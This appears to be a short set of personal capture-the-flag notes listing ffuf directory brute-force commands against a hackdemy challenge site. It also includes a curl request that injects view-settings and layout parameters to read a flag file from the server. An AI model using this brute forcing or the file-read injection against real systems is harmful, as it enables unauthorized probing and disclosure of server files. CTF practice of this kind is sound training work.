# puff-commands
its a fluff commands

for directory brute force

    fuf -u http://challenges.hackdemy.com/api-heist/api/v1/FUZZ -w ~/wordlists/directory-list-2.3-medium.txt


    
    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u https://challenges.hackdemy.com/api-heist/v2


for finding vulnerable endpoints 


    ffuf -u https://challenges.hackdemy.com/handle/FUZZ -w /usr/share/wordlists/dirb/common.txt 

     curl "http://challenges.hackdemy.com/handle?settings%5Bviews%5D=.&settings%5Bview%20options%5D%5Blayout%5D)=flag.txt" 

    ffuf -u https://challenges.hackdemy.com/handle/FUZZ -w /usr/share/wordlists/dirb/common.txt


